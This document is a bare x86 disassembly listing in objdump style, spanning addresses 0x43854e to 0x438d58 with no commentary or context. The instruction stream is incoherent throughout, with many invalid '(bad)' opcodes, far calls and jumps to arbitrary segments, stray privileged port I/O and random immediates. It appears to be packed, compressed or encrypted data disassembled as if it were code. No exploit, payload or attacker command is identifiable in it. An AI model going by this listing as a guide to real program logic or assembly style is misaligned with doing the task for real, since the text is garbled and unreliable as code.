  43854e:	adc    dl,BYTE PTR [ebx+0x220b805e]
  438554:	xor    ebx,0xbe50616b
  43855a:	(bad)  
  43855b:	xlat   BYTE PTR ds:[ebx]
  43855c:	dec    edi
  43855d:	or     eax,0x6c714f62
  438562:	adc    eax,0xb98d7590
  438567:	js     0x4385de
  438569:	jbe    0x43855c
  43856b:	addr16 dec esp
  43856d:	dec    ebx
  43856e:	cmp    al,0xe4
  438570:	es add al,0x86
  438573:	add    bl,ah
  438575:	adc    eax,0xde7177bb
  43857a:	stos   BYTE PTR es:[edi],al
  43857b:	call   0xd37a:0x6f4b7d4c
  438582:	imul   edx,DWORD PTR [edi-0x2a],0x4f
  438586:	int    0xce
  438588:	add    ebp,DWORD PTR [edx-0x2049d52]
  43858e:	sub    edi,0x66c722e7
  438594:	ret    
  438595:	inc    esp
  438596:	jecxz  0x43852e
  438598:	pop    edi
  438599:	out    0x63,eax
  43859b:	retf   0x1af9
  43859e:	and    BYTE PTR ds:[ebx],0xe9
  4385a2:	les    eax,FWORD PTR [edi+0x53]
  4385a5:	pop    edi
  4385a6:	pop    esi
  4385a7:	mov    ebp,0x1d4302fc
  4385ac:	xchg   ebp,eax
  4385ad:	pop    edx
  4385ae:	sub    eax,0xc448a7a2
  4385b3:	push   ds
  4385b4:	iret   
  4385b5:	mov    ebp,0x1a7c26de
  4385ba:	sahf   
  4385bb:	xor    eax,0x839d82b4
  4385c0:	in     al,0x60
  4385c2:	(bad)  
  4385c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4385c4:	call   0xe15ebaf0
  4385c9:	imul   esi,DWORD PTR [ebx],0x5e
  4385cc:	mov    al,0xe3
  4385ce:	leave  
  4385cf:	dec    ebx
  4385d1:	add    DWORD PTR [esi+eax*4],0x45
  4385d5:	pop    es
  4385d6:	mov    esp,0x7c5a9ae6
  4385db:	iret   
  4385dc:	ds jle 0x4385f1
  4385df:	std    
  4385e0:	sbb    BYTE PTR [ebx-0x40],0x8a
  4385e4:	jl     0x43857d
  4385e6:	dec    edi
  4385e7:	pushaw 
  4385e9:	cwde   
  4385ea:	push   es
  4385eb:	sbb    eax,0xd1d30938
  4385f0:	les    esi,FWORD PTR [ebp+0x10]
  4385f3:	pop    esi
  4385f4:	add    eax,0x34d71f25
  4385f9:	into   
  4385fa:	into   
  4385fb:	imul   edx,DWORD PTR ds:0x41d67de7,0x45
  438602:	ret    0xbaba
  438605:	sahf   
  438606:	xchg   edx,eax
  438607:	jp     0x438656
  438609:	sub    eax,0xd886208d
  43860e:	rol    BYTE PTR [ebp+0x4b],1
  438611:	or     eax,0x9aec46ec
  438616:	jmp    0x438653
  438618:	add    ch,ah
  43861a:	jmp    0xb03f5eb7
  43861f:	rcr    BYTE PTR [ebx-0x7a],cl
  438622:	jl     0x438682
  438624:	ja     0x4385f3
  438626:	dec    edx
  438627:	jne    0x43862d
  438629:	mov    al,0x4
  43862b:	and    al,BYTE PTR [ecx+0x36]
  43862e:	mov    ?,WORD PTR ds:0xd47ce0d6
  438634:	call   FWORD PTR [eax+ebx*2+0x2d]
  438638:	add    cl,bh
  43863a:	popf   
  43863b:	inc    ebx
  43863c:	or     dl,BYTE PTR [ebx]
  43863e:	inc    esi
  43863f:	xlat   BYTE PTR ds:[ebx]
  438640:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438641:	cmc    
  438642:	sbb    edx,DWORD PTR [ecx+0x7cfd1039]
  438648:	(bad)  
  438649:	cmp    ecx,ebp
  43864b:	mov    WORD PTR [esi-0x18],cs
  43864e:	(bad)  
  43864f:	mov    ds:0x9f6cb08c,eax
  438654:	push   edx
  438655:	je     0x4385de
  438657:	push   bp
  438659:	(bad)
  43865c:	cwde   
  43865d:	retf   
  43865e:	mov    bh,0x10
  438660:	in     al,0xad
  438662:	cli    
  438663:	and    bl,dl
  438665:	xlat   BYTE PTR ds:[ebx]
  438666:	add    DWORD PTR [eax+0x5d],edi
  438669:	scas   al,BYTE PTR es:[edi]
  43866a:	outs   dx,BYTE PTR ds:[esi]
  43866b:	and    ebx,DWORD PTR [ebx-0x5bf44dfd]
  438671:	pop    edi
  438672:	div    DWORD PTR [ebx-0x36ce349b]
  438678:	sbb    DWORD PTR [eax+0x3cd8ae93],0xffffffee
  43867f:	xchg   ebp,eax
  438680:	in     eax,dx
  438681:	cmc    
  438682:	sub    al,0x8d
  438684:	jnp    0x438697
  438686:	inc    edx
  438687:	scas   eax,DWORD PTR es:[edi]
  438688:	cdq    
  438689:	or     ebx,edi
  43868b:	mov    dh,0x83
  43868d:	adc    al,0x1f
  43868f:	imul   ebx,ebp,0x487dccbc
  438695:	sbb    al,0x6a
  438697:	xchg   BYTE PTR [edi],bl
  438699:	cmp    dl,al
  43869b:	or     ch,ch
  43869d:	dec    eax
  43869e:	sbb    eax,DWORD PTR ds:0x3751c7e8
  4386a4:	pop    ds
  4386a5:	and    bl,dl
  4386a7:	jp     0x43865f
  4386a9:	xor    BYTE PTR [edx],dl
  4386ab:	aam    0x13
  4386ad:	cmp    al,0xde
  4386af:	rcl    BYTE PTR [ebp+0x15],0x97
  4386b3:	xchg   ecx,ebp
  4386b5:	xchg   ecx,eax
  4386b6:	pop    esp
  4386b7:	xor    al,0x7f
  4386b9:	jg     0x43870a
  4386bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4386bc:	aam    0xcb
  4386be:	inc    edi
  4386bf:	test   al,0x11
  4386c1:	xor    DWORD PTR [edi+ecx*8+0x57],0xffffffc7
  4386c6:	sub    eax,0xec083e05
  4386cb:	sbb    edx,DWORD PTR [esi]
  4386cd:	xchg   ecx,eax
  4386ce:	cmp    DWORD PTR [ecx-0x9],0xf237c66c
  4386d5:	mov    edx,0xd542ac52
  4386da:	dec    edi
  4386db:	add    eax,0x647f6cef
  4386e0:	push   ss
  4386e1:	das    
  4386e2:	daa    
  4386e3:	nop
  4386e4:	dec    edi
  4386e5:	fimul  WORD PTR [ebx+ebp*2+0x56]
  4386e9:	jmp    0xe162568b
  4386ee:	xchg   DWORD PTR [ecx+0x350d44f3],edx
  4386f4:	adc    eax,0x80f630e6
  4386f9:	aam    0x83
  4386fb:	mov    cl,bh
  4386fd:	jle    0x43868e
  4386ff:	ficom  DWORD PTR [ecx+0x6f]
  438702:	mov    ebp,0xf8e2e23a
  438707:	xchg   DWORD PTR [ebx-0x3a9b0eaf],edx
  43870d:	sbb    esp,DWORD PTR [esi-0x58a1a8fe]
  438713:	sub    al,0x99
  438715:	and    dl,BYTE PTR [eax-0x3b]
  438718:	jae    0x438724
  43871a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43871b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43871c:	dec    eax
  43871d:	in     al,dx
  43871e:	jmp    0xf9318a43
  438723:	fs pop ebp
  438725:	(bad)  
  438726:	cmc    
  438727:	adc    BYTE PTR [edx-0x1c],dl
  43872a:	out    dx,eax
  43872b:	add    bl,BYTE PTR [ecx+0x10df156d]
  438731:	and    dh,ah
  438733:	scas   eax,DWORD PTR es:[edi]
  438734:	mov    DWORD PTR [esi+esi*2],esi
  438737:	retf   
  438738:	pop    ebp
  438739:	adc    ecx,DWORD PTR [esi-0x433e0ded]
  43873f:	call   0x9dbb:0x10ed6ef7
  438746:	push   ebx
  438747:	push   0x660c42da
  43874c:	cmp    DWORD PTR [edi+0x51],esp
  43874f:	data16 ss jecxz 0x438747
  438753:	out    0x98,al
  438755:	and    esp,ecx
  438757:	xchg   DWORD PTR [edi+0x7a],ecx
  43875a:	scas   eax,DWORD PTR es:[edi]
  43875b:	fdiv   QWORD PTR [ebx+ecx*4]
  43875e:	ss mov esp,0x8b32b285
  438764:	pop    ss
  438765:	or     eax,0xd1ce31f7
  43876a:	into   
  43876b:	lods   eax,DWORD PTR ds:[esi]
  43876c:	(bad)
  438770:	sub    DWORD PTR [edx-0x1b7ebcbf],esp
  438776:	jmp    0xd6c8b9df
  43877b:	lods   al,BYTE PTR ds:[esi]
  43877c:	cmp    DWORD PTR ds:0x29f2ddfe,edi
  438782:	dec    ebx
  438783:	into   
  438784:	sub    BYTE PTR [ebp+ebp*1+0x36],bl
  438788:	test   al,0x57
  43878a:	cli    
  43878b:	test   DWORD PTR [ecx],eax
  43878d:	hlt    
  43878e:	repnz out 0xc3,al
  438791:	dec    eax
  438792:	adc    eax,0x560dc13e
  438797:	sub    esi,ebx
  438799:	cmp    BYTE PTR [ebx+0x1cfdd4f1],dl
  43879f:	push   eax
  4387a0:	add    BYTE PTR [esi+eiz*8-0x46],dl
  4387a4:	and    ch,BYTE PTR [ecx+0x3de5daf4]
  4387aa:	jmp    0x9fc1:0x9513b274
  4387b1:	mov    dh,0x5a
  4387b3:	dec    eax
  4387b4:	(bad)  
  4387b5:	daa    
  4387b6:	iret   
  4387b7:	cmp    al,0xfd
  4387b9:	gs sbb ah,bh
  4387bc:	or     BYTE PTR [edi],ah
  4387be:	add    al,0xa0
  4387c0:	sbb    ah,BYTE PTR [ebx-0x35]
  4387c3:	cmp    eax,0x553beebc
  4387c8:	retf   
  4387c9:	sbb    bh,dh
  4387cb:	loop   0x4387e9
  4387cd:	mov    eax,DWORD PTR [esi+0x53beaf69]
  4387d3:	xchg   ebx,eax
  4387d4:	std    
  4387d5:	xor    DWORD PTR [esi],ebx
  4387d7:	dec    ebx
  4387d8:	or     BYTE PTR [ebp-0x7c],0x7e
  4387dc:	dec    edi
  4387dd:	aaa    
  4387de:	sbb    BYTE PTR ds:0x43389089,0x70
  4387e5:	sti    
  4387e6:	loope  0x438832
  4387e8:	enter  0xf9a6,0x13
  4387ec:	and    eax,0xe6c8f4b
  4387f1:	fisttp DWORD PTR [ebp-0x7f]
  4387f4:	sbb    BYTE PTR [eax],bl
  4387f6:	retf   
  4387f7:	mov    edx,0xb54f344d
  4387fc:	cdq    
  4387fd:	xchg   DWORD PTR [esi-0x76],edi
  438800:	ret    0x1b24
  438803:	push   esi
  438804:	(bad)  
  438805:	cli    
  438806:	and    cl,BYTE PTR ds:0x48a5800
  43880c:	xor    dh,0x5a
  43880f:	outs   dx,DWORD PTR ds:[esi]
  438810:	das    
  438811:	dec    eax
  438812:	or     DWORD PTR [edi],ecx
  438814:	add    eax,0xc18bed3
  438819:	jbe    0x438877
  43881b:	or     al,BYTE PTR [esi+0x5d]
  43881e:	xchg   ebp,eax
  43881f:	fimul  WORD PTR [ecx]
  438821:	popa   
  438822:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438823:	mov    edx,0x72371544
  438828:	xchg   ecx,eax
  438829:	and    eax,DWORD PTR [ebp-0x7d6f5bf1]
  43882f:	mov    dh,0x49
  438831:	cld    
  438832:	mov    esp,esi
  438834:	dec    edi
  438835:	jne    0x4387ba
  438837:	jge    0x4387e5
  438839:	adc    edi,DWORD PTR ds:0x7cdf6358
  43883f:	cmp    ebp,DWORD PTR [edi+ebx*2]
  438842:	xchg   esi,eax
  438843:	and    eax,0x8ed211
  438848:	ret    0xc4d7
  43884b:	jmp    0xbca75ce3
  438850:	adc    BYTE PTR [edi-0x7593f4da],al
  438856:	data16 test al,0x43
  438859:	sub    al,0xf9
  43885b:	mov    bl,0x72
  43885d:	arpl   WORD PTR [ecx],sp
  43885f:	mov    al,ds:0xed01f314
  438864:	(bad)  
  438865:	repnz mov BYTE PTR [edx],dh
  438868:	lea    edi,[eax-0x217136bf]
  43886e:	jnp    0x438855
  438870:	int    0x42
  438872:	in     al,dx
  438873:	mov    esi,DWORD PTR [eax]
  438875:	add    eax,0x86cb4e2b
  43887a:	cmp    al,0xe2
  43887c:	aas    
  43887d:	dec    esi
  43887e:	fild   DWORD PTR [edx+0x0]
  438881:	bound  ebp,QWORD PTR ds:0xec158a1d
  438887:	ds add esi,0x53a8e49
  43888e:	adc    al,0xe9
  438890:	sbb    ebx,DWORD PTR [edx+0xc]
  438893:	mov    DWORD PTR [eax],edx
  438895:	cs inc ebx
  438897:	arpl   WORD PTR [ebp+0x7b],bp
  43889a:	dec    eax
  43889b:	sbb    BYTE PTR [esi],bh
  43889d:	cli    
  43889e:	test   eax,0x72d0a967
  4388a3:	inc    edi
  4388a4:	mov    cl,0xa6
  4388a6:	mov    eax,0xbe194711
  4388ab:	test   al,0x3c
  4388ad:	jno    0x4388dd
  4388af:	xor    DWORD PTR [ebx],edx
  4388b1:	or     BYTE PTR [esp+eax*1-0x4ea1679e],0x15
  4388b9:	sub    eax,0xfefc26e2
  4388be:	xor    bl,al
  4388c0:	push   esi
  4388c1:	xchg   DWORD PTR [edi+0x57c43b6e],ecx
  4388c7:	scas   eax,DWORD PTR es:[edi]
  4388c8:	hlt    
  4388c9:	push   edx
  4388ca:	aam    0xe3
  4388cc:	popa   
  4388cd:	or     DWORD PTR [eax-0x32],ecx
  4388d0:	or     BYTE PTR [edx-0x7947363d],ah
  4388d6:	xor    bl,bh
  4388d8:	lock and al,0x3d
  4388db:	les    esp,FWORD PTR [ecx+0x60]
  4388de:	hlt    
  4388df:	jnp    0x438958
  4388e1:	add    al,0xd2
  4388e3:	enter  0x4d4b,0x38
  4388e7:	mov    dl,0x49
  4388e9:	mov    ecx,DWORD PTR [eax]
  4388eb:	ins    BYTE PTR es:[edi],dx
  4388ec:	jns    0x43890e
  4388ee:	fnstcw WORD PTR [edx+0x6e52a96e]
  4388f4:	push   es
  4388f5:	and    al,0x16
  4388f7:	inc    ecx
  4388f8:	add    DWORD PTR [esi],edx
  4388fa:	aaa    
  4388fb:	ret    
  4388fc:	fcom   QWORD PTR [ebx-0x65]
  4388ff:	imul   eax,DWORD PTR [edi],0x24bb1f34
  438905:	mov    bl,0xfa
  438907:	cmc    
  438908:	sahf   
  438909:	stc    
  43890a:	adc    ebx,DWORD PTR [edi+esi*1-0x2e3098cb]
  438911:	lock xchg edx,eax
  438913:	jmp    0x243a839f
  438918:	fsubrp st(7),st
  43891a:	rcr    BYTE PTR [eax],1
  43891c:	cmp    ch,ah
  43891e:	push   eax
  43891f:	sbb    BYTE PTR [edi+0x18b5595a],al
  438925:	or     BYTE PTR [ebp+ebx*1+0x70ce2ca5],0xcf
  43892d:	xlat   BYTE PTR ds:[ebx]
  43892e:	fadd   QWORD PTR [esi+0x76165224]
  438934:	arpl   WORD PTR [esi-0x42],bp
  438937:	shl    ebx,cl
  438939:	push   esp
  43893a:	fsubrp st(5),st
  43893c:	fld    DWORD PTR [esi+eiz*1-0x14]
  438940:	mov    dh,cl
  438942:	xchg   esi,eax
  438943:	jle    0x4388f4
  438945:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438947:	xchg   BYTE PTR [ebp-0x48],dh
  43894a:	xchg   ebp,eax
  43894b:	int    0xed
  43894d:	cmp    BYTE PTR [eax*2-0x429c77d6],cl
  438954:	ins    BYTE PTR es:[edi],dx
  438955:	sub    BYTE PTR [ebp+0x76],dh
  438958:	jmp    0xfe3a94bf
  43895d:	xor    ecx,edi
  43895f:	out    0xf5,eax
  438961:	mov    BYTE PTR [ebp-0x6b3967],0xd8
  438968:	and    al,bh
  43896a:	jbe    0x438977
  43896c:	push   ds
  43896d:	or     eax,0x27c2debd
  438972:	cli    
  438973:	sbb    esp,DWORD PTR [esi+0x4e2e175c]
  438979:	mov    ss:0x8ae24ea7,eax
  43897f:	dec    esp
  438980:	iret   
  438981:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438982:	loope  0x43896a
  438984:	gs pop ecx
  438986:	cmp    ah,BYTE PTR [esi+0x2f]
  438989:	push   edi
  43898a:	jp     0x438961
  43898c:	repnz fstp DWORD PTR [ecx-0xb715e1a]
  438993:	sbb    esi,DWORD PTR [edx+0x11338fa5]
  438999:	mov    ebx,esp
  43899b:	enter  0x97cd,0x57
  43899f:	ins    DWORD PTR es:[edi],dx
  4389a0:	jno    0x438958
  4389a2:	out    0xd5,al
  4389a4:	dec    ebp
  4389a5:	xchg   esi,eax
  4389a6:	push   edi
  4389a7:	in     eax,0x76
  4389a9:	cli    
  4389aa:	pushf  
  4389ab:	push   ecx
  4389ac:	jl     0x4389dc
  4389ae:	xchg   ebx,eax
  4389af:	clc    
  4389b0:	jb     0x438997
  4389b2:	xor    DWORD PTR ds:0xa03b598f,edx
  4389b8:	inc    edi
  4389b9:	xchg   ebx,ebx
  4389bb:	and    dl,BYTE PTR [edi+0x7e098cb6]
  4389c1:	mov    ds:0xb7352066,eax
  4389c6:	fidiv  DWORD PTR [ebp+0x63be4f5e]
  4389cc:	test   eax,0x81f6849a
  4389d1:	xchg   DWORD PTR ds:0x71076330,esi
  4389d7:	mov    al,ds:0xa57a22dd
  4389dc:	mov    al,0xf5
  4389de:	sbb    al,0x2a
  4389e0:	pop    ss
  4389e1:	fs xor al,0xcc
  4389e4:	daa    
  4389e5:	inc    esp
  4389e6:	mov    ds:0x6152281e,al
  4389eb:	ret    0x3885
  4389ee:	inc    esi
  4389ef:	xor    DWORD PTR [esi-0x55],ebp
  4389f2:	jg     0x438a31
  4389f4:	push   cs
  4389f5:	mov    WORD PTR ds:0xe617f6de,cs
  4389fb:	lock push 0xd40509c9
  438a01:	enter  0xa912,0x9f
  438a05:	call   0xb078:0x8e003dad
  438a0c:	or     al,ah
  438a0e:	out    0x6f,eax
  438a10:	rep lods eax,DWORD PTR ds:[esi]
  438a12:	fmul   st(2),st
  438a14:	inc    eax
  438a15:	stc    
  438a16:	out    dx,eax
  438a17:	shl    DWORD PTR [ebp-0x793feb1c],0xe7
  438a1e:	aad    0xac
  438a20:	lods   eax,DWORD PTR ds:[esi]
  438a21:	mov    ds:0x15a74af4,eax
  438a26:	fisttp QWORD PTR [esi+0x197260a]
  438a2c:	(bad)  
  438a2d:	or     cl,BYTE PTR [ebx-0x25]
  438a30:	adc    esp,DWORD PTR [esi]
  438a32:	jp     0x438aa3
  438a34:	icebp  
  438a35:	adc    edx,edi
  438a37:	or     DWORD PTR [edi-0x61d201c4],eax
  438a3d:	(bad)  
  438a3e:	jmp    0xb1b9:0x69bdeaec
  438a45:	xor    ch,bl
  438a47:	fst    DWORD PTR [ebp+0x1c]
  438a4a:	cdq    
  438a4b:	inc    esp
  438a4c:	mov    ecx,0xabca5571
  438a51:	retf   0xd5d1
  438a54:	in     al,0x88
  438a56:	jmp    0xabf9:0x5013e251
  438a5d:	push   es
  438a5e:	mov    ch,0x94
  438a60:	add    BYTE PTR [ecx-0x9ffdcd8],al
  438a66:	retf   0xe646
  438a69:	or     edx,DWORD PTR [edx-0x35f98744]
  438a6f:	add    dh,BYTE PTR [edi]
  438a71:	(bad)  
  438a72:	mov    ebp,0x84fa5a86
  438a77:	jmp    0x438acf
  438a79:	pop    ebx
  438a7a:	mov    ecx,es
  438a7c:	enter  0xb6e9,0xe0
  438a80:	sub    al,0xd0
  438a82:	outs   dx,BYTE PTR ds:[esi]
  438a83:	adc    esi,DWORD PTR [eax]
  438a85:	stos   BYTE PTR es:[edi],al
  438a86:	pusha  
  438a87:	ins    BYTE PTR es:[edi],dx
  438a88:	imul   ebp,edi,0x2c
  438a8b:	pop    edx
  438a8c:	shl    BYTE PTR [esi-0x6ed61aa7],1
  438a92:	and    edx,DWORD PTR [esp+esi*1]
  438a95:	mov    esp,0x5e704de
  438a9a:	repz sbb DWORD PTR [esi+0x19],edi
  438a9e:	sub    al,0x94
  438aa0:	lods   eax,DWORD PTR ds:[esi]
  438aa2:	jb     0x438b07
  438aa4:	jle    0x438afe
  438aa6:	xchg   esp,eax
  438aa7:	leave  
  438aa8:	mov    BYTE PTR [edx+eax*1],0xf7
  438aac:	inc    ecx
  438aad:	mov    ecx,0x99e14044
  438ab2:	pop    esi
  438ab3:	iret   
  438ab4:	pop    ecx
  438ab5:	popf   
  438ab6:	or     edx,DWORD PTR [ecx]
  438ab8:	mov    ebp,0x6dfa44f9
  438abd:	cmp    al,ah
  438abf:	movsx  esi,BYTE PTR [ebx-0x6a7b469f]
  438ac6:	xchg   ebp,eax
  438ac7:	sti    
  438ac8:	adc    ebp,DWORD PTR [esi+eiz*2-0x4dbfe352]
  438acf:	xor    eax,0xb040f6ea
  438ad4:	jl     0x438a6b
  438ad6:	ins    DWORD PTR es:[edi],dx
  438ad7:	mov    ebp,edx
  438ad9:	pusha  
  438ada:	iret   
  438adb:	push   es
  438adc:	popf   
  438add:	jmp    0x76f9a2f1
  438ae2:	mov    esi,0x7f9cf1b1
  438ae7:	cmp    edi,DWORD PTR [ebx+ebp*1-0x7a]
  438aeb:	push   0x7b
  438aed:	and    BYTE PTR [eax-0x42],dl
  438af0:	js     0x438a90
  438af2:	into   
  438af3:	fisub  DWORD PTR ds:0xc647d722
  438af9:	out    dx,al
  438afa:	icebp  
  438afb:	hlt    
  438afc:	sbb    ecx,ebx
  438afe:	cmp    ebp,ebx
  438b00:	mov    esi,esi
  438b02:	inc    esp
  438b03:	cli    
  438b04:	stc    
  438b05:	popa   
  438b06:	xor    eax,0x90e33f49
  438b0b:	push   0x2ca42eec
  438b10:	and    al,0xac
  438b12:	push   cs
  438b13:	adc    ah,BYTE PTR [eax-0x546fdd84]
  438b19:	xor    al,0x43
  438b1b:	inc    edi
  438b1c:	mov    gs,WORD PTR [edx+0x5a47a54e]
  438b22:	stc    
  438b23:	sbb    bh,bh
  438b25:	mov    edx,0x2bddd7a4
  438b2a:	(bad)  
  438b2b:	jg     0x438b53
  438b2d:	mov    esp,0x3539784e
  438b32:	loopne 0x438b34
  438b34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438b35:	xlat   BYTE PTR ds:[ebx]
  438b36:	test   al,0x3e
  438b38:	mov    DWORD PTR ds:0xc2852866,eax
  438b3e:	test   eax,0x81b35c3c
  438b43:	ret    0xf536
  438b46:	aad    0xd3
  438b48:	das    
  438b49:	imul   BYTE PTR [ecx]
  438b4b:	jmp    0x438b42
  438b4d:	adc    ah,al
  438b4f:	xchg   esi,eax
  438b50:	sbb    al,0xd7
  438b52:	fisubr WORD PTR [edx+ecx*4]
  438b55:	jb     0x438af4
  438b57:	pop    es
  438b58:	lds    eax,FWORD PTR [esi+edx*8]
  438b5b:	aaa    
  438b5c:	mov    bh,BYTE PTR [ebp-0x3226b8df]
  438b62:	xor    DWORD PTR [ebp+0x43],edx
  438b65:	popf   
  438b66:	push   ss
  438b67:	retf   0x34c7
  438b6a:	ficom  WORD PTR [ebx+ebx*1-0x75cc2359]
  438b71:	push   es
  438b72:	and    ebp,DWORD PTR [esi+0x48]
  438b75:	add    eax,0xe7a5376a
  438b7a:	imul   esi,DWORD PTR [eax],0xffffff9f
  438b7d:	or     eax,0x41e8eda0
  438b82:	in     al,0x9a
  438b84:	sahf   
  438b85:	out    dx,al
  438b86:	test   al,0x89
  438b88:	aas    
  438b89:	mov    ch,0x1a
  438b8b:	mov    BYTE PTR [edx-0x6117606a],bl
  438b91:	loop   0x438b82
  438b93:	pop    esp
  438b94:	cmp    DWORD PTR [ebx],esi
  438b96:	cmp    BYTE PTR [esi],0xe6
  438b99:	call   0x5978:0xf47b94e5
  438ba0:	or     BYTE PTR [ebx-0x6c9899b6],ah
  438ba6:	neg    BYTE PTR [eax]
  438ba8:	retf   0xbd88
  438bab:	push   cs
  438bac:	test   al,0xc3
  438bae:	dec    edx
  438baf:	push   edi
  438bb0:	pop    esi
  438bb1:	je     0x438c2d
  438bb3:	test   esp,0x6177ade5
  438bb9:	out    dx,al
  438bba:	xchg   esp,eax
  438bbb:	inc    esp
  438bbc:	and    BYTE PTR [edx+0x231f98a2],dh
  438bc2:	sbb    ebp,ebp
  438bc4:	hlt    
  438bc5:	rcl    DWORD PTR [eax+0x3d],cl
  438bc8:	and    esi,0xffffff80
  438bcb:	push   0xe6b3fb61
  438bd0:	or     BYTE PTR [edi+0x15],0xc7
  438bd4:	pop    ebx
  438bd5:	mov    cs,edi
  438bd7:	push   ss
  438bd8:	fidiv  DWORD PTR [esi-0x7811ce04]
  438bde:	mov    cl,0xf6
  438be0:	(bad)  
  438be1:	mov    eax,ds:0x51929d18
  438be6:	into   
  438be7:	jmp    0x438c12
  438be9:	push   esp
  438bea:	imul   esp,DWORD PTR [edi-0x38edea23],0x973e2b50
  438bf4:	nop
  438bf5:	sbb    ebx,DWORD PTR [ecx+0x71]
  438bf8:	sbb    bh,BYTE PTR [esi]
  438bfa:	call   0x8d7e18ba
  438bff:	mov    ah,BYTE PTR [edx+0x735697ed]
  438c05:	xor    BYTE PTR [edx+0x7696989f],dl
  438c0b:	cmp    bl,ch
  438c0d:	in     eax,0xf4
  438c0f:	inc    ebx
  438c10:	mov    esi,0x5e0ecd93
  438c15:	pop    ecx
  438c16:	add    BYTE PTR [ebx+0x35bdf4e9],dl
  438c1c:	add    esp,esi
  438c1e:	jp     0x438c1e
  438c20:	push   ecx
  438c21:	arpl   WORD PTR [esi],di
  438c23:	dec    esp
  438c24:	loop   0x438c08
  438c26:	push   ss
  438c27:	add    ch,BYTE PTR [edx]
  438c29:	repz mov cl,0x85
  438c2c:	out    dx,eax
  438c2d:	shl    edi,0x79
  438c30:	mov    ebx,esi
  438c32:	pop    edi
  438c33:	cmc    
  438c34:	loop   0x438bb9
  438c36:	stc    
  438c37:	mov    edi,0x80a4f1e9
  438c3c:	push   ss
  438c3d:	fld    DWORD PTR [edx+edx*8-0x18cf68c9]
  438c44:	leave  
  438c45:	lods   eax,DWORD PTR ds:[esi]
  438c46:	dec    ebx
  438c47:	(bad)  
  438c48:	jns    0x438cab
  438c4a:	xchg   esp,eax
  438c4b:	mov    edx,0x2875e516
  438c50:	mov    esp,0x9e2759e
  438c55:	je     0x438bfc
  438c57:	ins    BYTE PTR es:[edi],dx
  438c58:	jns    0x438c7d
  438c5a:	loop   0x438c97
  438c5c:	sbb    ecx,edx
  438c5e:	in     al,dx
  438c5f:	int    0xf2
  438c61:	cmp    eax,0xe8e87fb0
  438c66:	inc    eax
  438c67:	push   ebx
  438c68:	push   es
  438c69:	pop    eax
  438c6a:	sub    al,0x86
  438c6c:	jl     0x438ca5
  438c6e:	sbb    ebp,edi
  438c70:	push   ecx
  438c71:	scas   al,BYTE PTR es:[edi]
  438c72:	call   0x650e0cfc
  438c77:	sub    DWORD PTR [esi+0x4b40857b],edx
  438c7d:	sub    cl,ah
  438c7f:	inc    ebp
  438c80:	xor    dl,BYTE PTR [ebx]
  438c82:	call   FWORD PTR [edx-0x77c1ffec]
  438c88:	cmp    BYTE PTR [edi+0x1b],dl
  438c8b:	in     al,dx
  438c8c:	pop    edx
  438c8d:	xor    eax,0x6c988587
  438c92:	jnp    0x438cd9
  438c94:	cld    
  438c95:	add    eax,0x266e27dd
  438c9a:	iret   
  438c9b:	sahf   
  438c9c:	in     eax,0xd5
  438c9e:	stos   BYTE PTR es:[edi],al
  438c9f:	dec    esp
  438ca0:	sub    dl,ah
  438ca2:	pop    ecx
  438ca3:	push   ss
  438ca4:	jmp    0x438c85
  438ca6:	xchg   BYTE PTR [ebx],ah
  438ca8:	ss pop esi
  438caa:	jp     0x438cfe
  438cac:	jg     0x438d2d
  438cae:	jle    0x438ca8
  438cb0:	frstor [ebx+0x3f]
  438cb3:	mov    ebx,0x49581134
  438cb8:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  438cba:	push   eax
  438cbb:	jns    0x438d2f
  438cbd:	and    eax,0x3fc74ca7
  438cc2:	daa    
  438cc3:	push   ss
  438cc4:	push   esp
  438cc5:	js     0x438d20
  438cc7:	add    DWORD PTR [ecx+eax*8],eax
  438cca:	inc    esp
  438ccb:	mov    eax,0x302e97c5
  438cd0:	mov    bl,0x10
  438cd2:	int3   
  438cd3:	cli    
  438cd4:	mov    cl,0x7e
  438cd6:	dec    esp
  438cd7:	jae    0x438c93
  438cd9:	popa   
  438cda:	dec    eax
  438cdb:	mov    ch,BYTE PTR [edx+0x1e4d13e3]
  438ce1:	ror    al,0x9c
  438ce4:	push   ebx
  438ce5:	inc    esp
  438ce6:	jne    0x438d49
  438ce8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438ce9:	out    dx,al
  438cea:	mov    dl,0x6b
  438cec:	test   BYTE PTR [eax-0x79],0x7f
  438cf0:	xchg   edx,eax
  438cf1:	xchg   ebx,eax
  438cf2:	mov    BYTE PTR [ebx+0x33],dl
  438cf5:	add    al,0x6c
  438cf7:	sahf   
  438cf8:	aaa    
  438cf9:	(bad)  
  438cfc:	push   ebp
  438cfd:	adc    edx,DWORD PTR [eax]
  438cff:	pusha  
  438d00:	inc    ebx
  438d01:	sbb    DWORD PTR [ecx+0x462603e3],edx
  438d07:	adc    DWORD PTR [eax+0x70],eax
  438d0a:	or     esi,0x5f
  438d0d:	hlt    
  438d0e:	mov    bh,0xd5
  438d10:	dec    esi
  438d11:	in     eax,dx
  438d12:	mov    edi,0x5608b739
  438d17:	scas   al,BYTE PTR es:[edi]
  438d18:	gs sub al,0x60
  438d1b:	and    BYTE PTR [ebx-0x3fec7d1a],dl
  438d21:	jne    0x438cea
  438d23:	out    0xe7,eax
  438d25:	dec    edx
  438d26:	leave  
  438d27:	jne    0x438cc2
  438d29:	mov    ah,0x25
  438d2b:	push   es
  438d2c:	fidivr DWORD PTR ds:0x2a06ab0d
  438d32:	xchg   esp,eax
  438d33:	in     al,dx
  438d34:	in     eax,0x29
  438d36:	inc    eax
  438d37:	xchg   BYTE PTR [edx-0x5f98fee3],al
  438d3d:	jl     0x438dbe
  438d3f:	push   0x26
  438d41:	and    BYTE PTR [ebp+esi*8-0x543734e8],al
  438d48:	push   0x3a3492e8
  438d4d:	pcmpgtb mm5,QWORD PTR [esi+ecx*1-0x2d94b2d9]
  438d55:	pop    ds
  438d56:	test   ebx,ebp
  438d58:	jp     0x438d8e
